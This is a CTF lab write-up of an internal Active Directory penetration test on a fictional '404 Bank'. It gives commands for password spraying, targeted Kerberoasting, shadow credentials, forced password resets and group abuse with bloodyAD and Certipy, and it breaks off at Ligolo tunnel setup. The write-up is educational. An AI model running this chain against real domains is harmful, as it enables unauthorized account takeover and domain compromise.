# 404 Bank | Writeups

## Scenario

### Objective / Scope

404 Bank, a staple of the local financial community, is conducting its annual security assessment. To uphold their motto of being **"Proven, Local, Strong,"** the bank has commissioned the **Hack Smarter Red Team** to perform an internal penetration test.

### Initial Access

You have been provided with VPN access to their internal environment, but no other information.

## Summary

In Bank 404 we begin only with VPN access and no other information.

Enumeration of the website reveals a downloadable executable, `CorpBankDialer.exe`, containing a Base64-encoded MD5 hash that, once cracked, provides a valid password. Combining this with usernames generated from staff names found on the site, we authenticate as `karl.hackermann`. Using these credentials, we perform BloodHound enumeration and discover that `karl.hackermann` has `GenericWrite` permissions over `tom.reboot`. We escalate via Targeted Kerberoasting, extracting a TGS, and cracking it to recover `tom.reboot`’s password. From there, chained permissions allow `ForceChangePassword` over `robert.graef`, who in turn can `ForceChangePassword` over `jan.tresor` and other users. After adding `jan.tresor` to the Remote Desktop Users group and changing the user’s password, we gain RDP access and recover credentials for `daniel.hoffmann` from a deleted email.

As `daniel.hoffmann`, we pivot to the `webadmin` user by resetting its password, then access an internal port `5000` service via Ligolo tunneling. Downloading and cracking a password-protected configuration archive yields credentials for `svc.services`, initially disabled. Using `robert.graef`’s `WriteAccountRestrictions` privilege, we re-enable the account and authenticate successfully. With `svc.services` belonging to the Certificate Service DCOM Access group, we identify a vulnerable Vuln-ESC4 template and exploit it using Certipy by reconfiguring it to an ESC1-style template and requesting a certificate for Administrator. Authenticating with the generated certificate provides the NT hash of Administrator, enabling domain compromise and retrieval of the final flag from the Administrator’s desktop.

## Recon

We use rustscan `-b 500 -a 10.0.28.235 -- -sC -sV -Pn` to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

```bash
rustscan -b 500 -a 10.0.28.235 -- -sC -sV -Pn
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FYCpQO2RuGG6k0nxYujnl%252Fgrafik.png%3Falt%3Dmedia%26token%3De5a769de-742e-46e3-8957-b6155a6a2711\&width=768\&dpr=3\&quality=100\&sign=7b695e8b\&sv=2)

The target machine is actually a domain controller with exposed services including DNS `53`, Kerberos `88/464`, an `IIS /10.0` web server on port `80`, multiple MSRPC endpoints `135, 593, 49664+`, SMB `139/445`, LDAP and LDAPS `389/636/3268/3269` tied to Active Directory, RDP `3389`, WinRM on `5985`, and .NET Remoting `9389`. This indicates a fully integrated Windows AD environment where LDAP/LDAPS and Kerberos provide authentication, SMB and RPC enable remote management, and RDP/WinRM serve as remote access points.

![](<../../../.gitbook/assets/image (5)>)

## WEB

We start our enumeration on the web server on port 80. We first visit the page with our browser and find a static site in front of us.

```bash
http://404finance.local/
```

![](<../../../.gitbook/assets/image (6)>)

As we scroll through the page, we also find a team of three people.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FKPY0abIMb0H2EZ3TvVe0%252Fgrafik.png%3Falt%3Dmedia%26token%3Da85e4c95-992d-4160-926b-6e6945f99782\&width=768\&dpr=3\&quality=100\&sign=c5c0ade4\&sv=2)

We note down the individual names of the team members so that we can generate usernames from them later for use.

```
Alex Meier
Robert Graef
Karl Hackermann
```

On the Services page, we also find an executable file. We download this file.

```bash
http://404finance.local/services.html
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FvdyIe9gDDbmy6AEsXx2m%252Fgrafik.png%3Falt%3Dmedia%26token%3Dfdde414a-e812-4ba4-89cd-3a7bc37dfc5f\&width=768\&dpr=3\&quality=100\&sign=b4b5cdf3\&sv=2)

Enumerating the directories using Feroxbuster did not yield any useful results.

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://404finance.local
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FooxWFnMJ1Km611SqNbTN%252Fgrafik.png%3Falt%3Dmedia%26token%3Dfdeea33e-cd39-4aa6-8bad-7ec13f7ebec3\&width=768\&dpr=3\&quality=100\&sign=f2efbfab\&sv=2)

## SMB

Before we dive in with username enumeration we try to authenticate as `guest` and anonymously against SMB, but without success. Nevertheless we generate the hosts file entry like the following:

```bash
nxc smb 10.0.28.235 -u '' -p '' --generate-hosts-file hosts
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fs1kZW8vYLBDBGA9zQlbO%252Fgrafik.png%3Falt%3Dmedia%26token%3D45abf808-cec5-492d-9162-0d830a21cfa0\&width=768\&dpr=3\&quality=100\&sign=8444a2be\&sv=2)

We add the following to our `/etc/hosts` file. We could also directly append the entry to our hosts file by providing the path to `/etc/hosts` in the NetExec command.

```
10.0.28.235     DC-404.404finance.local 404finance.local DC-404
```

## Access as karl.hackermann

During preliminary analysis using strings of the downloaded `CorpBankDialer.exe`, we find a DEBUG string encoded in base64.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FJNusm5E7vNLxkB2fHy7j%252Fgrafik.png%3Falt%3Dmedia%26token%3Dcf981fc0-b22f-4850-9542-395d52eda358\&width=768\&dpr=3\&quality=100\&sign=1ea81d48\&sv=2)

When we decode this, we get an MD5 hash. We then try to crack this. It could be a secret, or a password we might need to use later.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Ffki8dog3FabS0PJK4c8E%252Fgrafik.png%3Falt%3Dmedia%26token%3Ddbab472b-295f-47a8-84aa-6ac33ff27d4c\&width=768\&dpr=3\&quality=100\&sign=d921fa6c\&sv=2)

We crack the MD5 hash using hashcat and, based on the result we get, we are clearly dealing with a password.

```bash
hashcat -a0 -m0 'REDACTED' /usr/share/wordlists/rockyou.txt
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FoHryWzPg2i899OB8oSOu%252Fgrafik.png%3Falt%3Dmedia%26token%3D1d33f645-57b2-4f78-9822-98b192abbf2f\&width=768\&dpr=3\&quality=100\&sign=6f836630\&sv=2)

We have a password and a set of names from the team. What we still need are usernames to test the password against SMB or other available networks.

[GitHub - urbanadventurer/username-anarchy: Username tools for penetration testing](https://github.com/urbanadventurer/username-anarchy)

We generate these using username anarchy.

```bash
username-anarchy -i team.txt > usernames.txt
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FJ5jyuwpx09gzzNX14ZdL%252Fgrafik.png%3Falt%3Dmedia%26token%3Dda223b52-a384-4560-898e-f3a4ad2e1ecf\&width=768\&dpr=3\&quality=100\&sign=329b573c\&sv=2)

Next, we try every possible username from our username-anarchy result with the password found from the executable. In the end, we are successful; we can successfully authenticate as `karl.hackermann`.

```bash
nxc smb 404finance.local -u usernames.txt -p 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FoU5jHBzUhPdLVOABJWHg%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc45bc72b-8f44-4baf-8e61-5397ebebc9c7\&width=768\&dpr=3\&quality=100\&sign=e9b8ae01\&sv=2)

We don't see any special shares at first.

```bash
nxc smb 404finance.local -u karl.hackermann -p 'REDACTED' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F4oSLq6e6mao5VidllwDo%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd539f21d-acfc-409d-a0e4-ec1596945d5d\&width=768\&dpr=3\&quality=100\&sign=efbaf3a9\&sv=2)

## BloodHound enumeration

With the credentials, we can now also enumerate the AD using BloodHound.

```bash
bloodhound-ce.py --zip -c All -d 404finance.local -u 'karl.hackermann' -p 'REDACTED' -dc DC-404.404finance.local -ns 10.0.28.235
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FN6XisrPyFsPlSbzNBsuA%252Fgrafik.png%3Falt%3Dmedia%26token%3D711a3693-e540-4e79-8575-493fb77ea567\&width=768\&dpr=3\&quality=100\&sign=d6af6aeb\&sv=2)

We are able to identify `Administrator` as one of the Domain Admins.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FAyWdesSYRH5tUHFgNQq9%252Fgrafik.png%3Falt%3Dmedia%26token%3Df24b0e62-1206-4b97-be89-57b81dd55518\&width=768\&dpr=3\&quality=100\&sign=a0e7f294\&sv=2)

As `karl.hackermann`, we have `GenericWrite` permission over `tom.reboot`. With this, we can either perform a targeted Kerberoast attack to obtain a crackable service ticket, or carry out a shadow credentials attack, which would allow us to authenticate as `tom.reboot` without knowing their password like we did in Arasaka:

[Arasaka | Writeups](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/arasaka#shadow-credentials-attack)

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FAPss7d5DE1hBpGhpZzfA%252Fgrafik.png%3Falt%3Dmedia%26token%3Daef6b480-7313-40ea-9104-25bd96dedcc1\&width=768\&dpr=3\&quality=100\&sign=4d4c9967\&sv=2)

When we look at the shortest path from our owned object, we see that we can start from `karl.hackermann`, who has `GenericWrite` permissions over `tom.reboot`. This allows us to perform either a targeted Kerberoasting attack or a shadow credentials attack like mentioned before. Using this access, we can `ForceChangePassword` on `tom.reboot`, which in turn gives us control over `robert.graef`. From there, we can add all compromised users to the Remote Management Users group.

Furthermore, as `robert.graef`, we can `ForceChangePassword` on `nina.inkasso`, `melanie.kunz`, and `jan.tresor`.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FNlBWz7LTqo15w7mJLJ8i%252Fgrafik.png%3Falt%3Dmedia%26token%3Dacc95e8b-49f6-4041-b318-1f2cbcbf899e\&width=768\&dpr=3\&quality=100\&sign=f6ac4d7c\&sv=2)

{% hint style="info" %}
If a more recent version of `bloodhound-ce.py` is used, it might be possible to see even more permissions that `robert.graef` has. These will be necessary for the subsequent privilege escalation. Even though we cannot see them here in the output, we can still use them. More on this when we get to that point. For now, we can continue as follows.
{% endhint %}

## Access as tom.reboot

From our BloodHound analysis we know that `karl.hackermann` has a `GenericWrite` relationship to `tom.reboot`. This allows either a TargetedKerberoast or Shadow Credentials attack.

With the `GenericWrite` permission we are able to modify `tom.reboot`'s servicePrincipalName (SPN), request a service ticket for it, and perform offline Kerberos ticket cracking to recover its password.

In a Shadow Credentials Attack we abuse the `GenericWrite` permission to add a malicious key credential to `tom.reboot`, allowing authentication as that account without knowing its password.

We will show both options.

### TargetedKerberoast

We'll start with the TargetedKerberoast. See below links for further reading:

[Kerberoast | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#targeted-kerberoasting)

[Targeted Kerberoasting | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

> This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operator](https://www.thehacker.recipes/ad/movement/builtins/security-groups) group usually has those permissions.
>
> The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.

To perform the TargetedKerberoast we will use the following tool:

[GitHub - ShutdownRepo/targetedKerberoast: Kerberoast with ACL abuse capabilities](https://github.com/ShutdownRepo/targetedKerberoast)

We run the following command and are able to get the Kerberos 5, etype 23, TGS-REP blob of the `tom.reboot` user.

```bash
targetedKerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'REDACTED' --dc-ip 10.0.28.235
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FoWZGmu3UIj8zDf5JdO7d%252Fgrafik.png%3Falt%3Dmedia%26token%3D5b12b4a6-ac22-4292-abc5-33579e0990a6\&width=768\&dpr=3\&quality=100\&sign=a69f926f\&sv=2)

We use hashcat to crack the blob and are able to retrieve the password of `tom.reboot`.

```bash
hashcat -a0 -m13100 tom.reboot.blob /usr/share/wordlists/rockyou.txt --show
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FrPs7WJQkGvjn2N4pnzx2%252Fgrafik.png%3Falt%3Dmedia%26token%3D32a7e3c2-ebcc-4e14-b360-7dd72115e5d0\&width=768\&dpr=3\&quality=100\&sign=b075608d\&sv=2)

We test the credentials using NetExec. We successfully authenticated. We could now move on, or try the Shadow Credentials Attack.

```bash
nxc smb 404finance.local -u tom.reboot -p 'REDACTED' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FqhIDGfNoX4s73IIJKnAL%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc69252bf-434c-422b-82d9-aca74979d327\&width=768\&dpr=3\&quality=100\&sign=2b41bdf8\&sv=2)

### Shadow Credentials Attack

The following section describes the Shadow Credentials Attack. It’s an alternative path to the TargetedKerberoast attack and can be skipped.

Further information on the Shadow Credentials Attack can be found under the following link:

[Shadow Credentials | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials)

To perform the Shadow Credentials Attack we are using Certipy.

[GitHub - ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse](https://github.com/ly4k/Certipy?tab=readme-ov-file#shadow-credentials)

In short: if we can write to the `msDS-KeyCredentialLink` property of a user, we can retrieve the NT hash of that user.

With the following command we issue the attack and are successful. We retrieve the NT hash of `tom.reboot`.

```bash
certipy shadow auto -u 'karl.hackermann@404finance.local' -p 'REDACTED' -account 'tom.reboot' -dc-ip 10.1.57.15
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FqbAF5AHKusn9hcPenc0U%252Fgrafik.png%3Falt%3Dmedia%26token%3Df319ef1f-3444-4a92-983b-a93074454d8d\&width=768\&dpr=3\&quality=100\&sign=4b2a227b\&sv=2)

We test the credentials using NetExec. We successfully authenticated. We could now move on.

```bash
nxc ldap 404finance.local -u tom.reboot -H 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FuBSTHPibBUjgzTgtukKD%252Fgrafik.png%3Falt%3Dmedia%26token%3Ddf795708-0fac-4734-b455-a2e149a6e525\&width=768\&dpr=3\&quality=100\&sign=7218e6d9\&sv=2)

## Access as robert.graef

From our BloodHound analysis we know that `tom.reboot` has a `GenericWrite` relationship to `robert.graef`. This allows us to change the password of the user. The following resource showcases the different tools we could use to change the password of the user.

[ForceChangePassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

We will be using bloodyAD.

[GitHub - CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

Next, with the following command we change the password for `robert.graef` to `Pwned123@!`.

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'tom.reboot' -p 'REDACTED' set password 'robert.graef' 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FAoU2HrGzN4wK9yjardSV%252Fgrafik.png%3Falt%3Dmedia%26token%3Dfde8b091-3409-40e1-9bba-08fd66bac21f\&width=768\&dpr=3\&quality=100\&sign=5dc0a540\&sv=2)

We test the credentials using NetExec. We successfully authenticated. We move on.

```bash
nxc smb 404finance.local -u robert.graef -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FIMD9L8udzX0vHYEPOKNR%252Fgrafik.png%3Falt%3Dmedia%26token%3Daa15b439-b0db-4659-aa81-3380d57bff6c\&width=768\&dpr=3\&quality=100\&sign=a291b554\&sv=2)

## RDP session with jan.tresor

From `robert.graef`, we can `ForceChangePassword` on `nina.inkasso`, `melanie.kunz`, and `jan.tresor`. For now we will focus only on `jan.tresor` as that is the user having some valuable loot for us later.

[ForceChangePassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

With the following command we change the password for `jan.tresor` to `Pwned123@!`.

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Pwned123@!' set password 'jan.tresor' 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FidoSkna4q1ZkLd1Mnnz8%252Fgrafik.png%3Falt%3Dmedia%26token%3D29526e72-d4ca-4305-a8d5-bf16a8b2874c\&width=768\&dpr=3\&quality=100\&sign=fcbe9098\&sv=2)

We test the credentials using NetExec. We successfully authenticated. We move on.

```bash
nxc smb 404finance.local -u jan.tresor -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FaIlBZjup1NBDtWbvXPMP%252Fgrafik.png%3Falt%3Dmedia%26token%3Dedb02dd4-8cd2-499d-b32b-41f59a0fcd4f\&width=768\&dpr=3\&quality=100\&sign=1795c32a\&sv=2)

However, the user `jan.tresor` is not in the `Remote Desktop Users` group. That doesn't matter, because as `robert.graef` we can add users to this group thanks to the `AddMember` permission. We did this for all users in order to check for each initial access whether there was anything to be gained. However, we only found something with `jan.tresor`. To add a member to the group `Remote Desktop Users` we also use bloodyAD.

[AddMember | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/addmember#addmember)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Pwned123@!' add groupMember 'remote desktop users' 'jan.tresor'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F842UU7qITBV9GevgBzxo%252Fgrafik.png%3Falt%3Dmedia%26token%3D43d92a31-fd0b-4a9e-b0f6-e04f6a78bf3d\&width=768\&dpr=3\&quality=100\&sign=46c3fa1a\&sv=2)

After we have added `jan.tresor` to the Remote Management Users we are able to RDP into the machine. On the Desktop we find a full recycle bin.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FdMxDxdIqj7X0nZVlQtOW%252Fgrafik.png%3Falt%3Dmedia%26token%3Db2e94d3c-b0f0-47d5-9ced-005c0eacb5b3\&width=768\&dpr=3\&quality=100\&sign=894854f1\&sv=2)

## Shell as daniel.hoffmann

In the recycle bin, we find some email copies (`.eml` files). One of them may contain something valuable.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FJmmJHKDUgASRyMpkqORa%252Fgrafik.png%3Falt%3Dmedia%26token%3Dabffcba6-cf5b-4f4f-8299-8f726c899467\&width=768\&dpr=3\&quality=100\&sign=de5b0c5f\&sv=2)

The mail `Access Credentials - Don't tell Anyone` stands out in particular. Maybe we'll get lucky. In it, we find the password for Daniel Hoffmann.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FvZzd7fYwfEmpkwgucmuk%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc2886028-1948-42fa-b6c0-3031a3158e5c\&width=768\&dpr=3\&quality=100\&sign=6d3524c\&sv=2)

We test the credentials using NetExec. We successfully authenticated. We move on.

```bash
nxc smb 404finance.local -u daniel.hoffmann -p 'REDACTED' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FAHlWQXwwO0smuLjB5BXK%252Fgrafik.png%3Falt%3Dmedia%26token%3Db29921a2-79a4-43dd-af6e-b60f25e8ba3b\&width=768\&dpr=3\&quality=100\&sign=f815886b\&sv=2)

The user `daniel.hoffmann` is in the remote management user group, which would allow us to use evil-winrm for a session. We are testing this.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FBOtJQRPnEmJ9IXtt2qMI%252Fgrafik.png%3Falt%3Dmedia%26token%3D1caec70d-17cb-403d-bcaf-5dd389dcc971\&width=768\&dpr=3\&quality=100\&sign=c4e05c6d\&sv=2)

We connect to the target machine as `daniel.hoffmann` using evil-winrm and find the user flag at `C:\Users\daniel.hoffmann\Desktop\user.txt`.

```bash
evil-winrm -i DC-404.404finance.local -u daniel.hoffmann -p 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FLC5GNxwHEXIAHgYpmFjN%252Fgrafik.png%3Falt%3Dmedia%26token%3D8c0032eb-8b80-4e04-bdc3-74a1dee5f570\&width=768\&dpr=3\&quality=100\&sign=929d588a\&sv=2)

## Access as webadmin

We check our BloodHound data again to see if we can do more with `daniel.hoffmann` and see that he also has `ForceChangePassword` permissions. This is for the user `webadmin`.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fgt1wReoSOPkCrrxTcirS%252Fgrafik.png%3Falt%3Dmedia%26token%3D635b96a1-24f6-4e37-b321-261d68a34bb7\&width=768\&dpr=3\&quality=100\&sign=37ba3c8a\&sv=2)

However, it seems that we cannot proceed any further from `webadmin`. This could be a dead end or a clue. We have not enumerated further on the server yet. It is possible that an internal web server is running on it, from which we could proceed further.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FYI1tMZCmn4xj8ay3EsJn%252Fgrafik.png%3Falt%3Dmedia%26token%3Ddb030f76-b790-40e6-ba2f-9ed433002585\&width=768\&dpr=3\&quality=100\&sign=28f8b1c9\&sv=2)

We look at which ports are being listened to and find port 5000.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FvQ8B7pNPZnXWI9lMWLFI%252Fgrafik.png%3Falt%3Dmedia%26token%3D77163c72-a975-4aac-9f69-86a5dc5cb002\&width=768\&dpr=3\&quality=100\&sign=927df6e2\&sv=2)

We try to request it in the session using the `curl` alias, but we have to authenticate ourselves. We make the internal ports available to our attacker machine using Ligolo, but we could also do this on a smaller scale with Chisel.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%252F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FgohuiIirBElbTG9fI90B%252Fgrafik.png%3Falt%3Dmedia%26token%3Dae9fe4c7-68b9-4806-b3e8-9c1de49f5ba3\&width=768\&dpr=3\&quality=100\&sign=cc3748ac\&sv=2)

### Ligolo-ng setup

We will be using the latest release `v0.8.2`:

[GitHub - nicocha30/ligolo-ng: An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.](https://github.com/nicocha30/ligolo-ng)

First, we run a proxy.

```bash
sudo ./proxy -selfcert
```

